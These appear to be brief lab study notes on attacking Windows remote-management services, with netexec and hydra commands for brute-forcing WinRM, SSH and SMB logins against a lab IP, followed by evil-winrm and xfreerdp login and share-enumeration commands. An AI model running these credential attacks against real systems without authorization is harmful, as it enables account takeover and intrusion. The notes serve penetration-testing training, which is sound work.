WINRM uses TCP 5985 and 5986 by default
Compare it to RDP and SSH!


We can exploit using NETEXEC
it's a tool similar to hydra

sudo apt-get -y install netexec

It can also be used for: nfs,ftp,ssh,smb,wmi,rdp,mssql,ldap,vnc

To brute-force do:
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
netexec winrm 10.129.42.197 -u user.list -p password.list

hydra alternative:
hydra -L user.list -P password.list ssh://10.129.42.197
smb example:
hydra -L user.list -P password.list smb://10.129.42.197

login if successful using:
evil-winrm -i <target-IP> -u <username> -p <password>
xfreerdp /v:<target-IP> /u:<username> /p:<password>

enumerate the shares given specific credentials
netexec smb 10.129.42.197 -u "user" -p "password" --shares
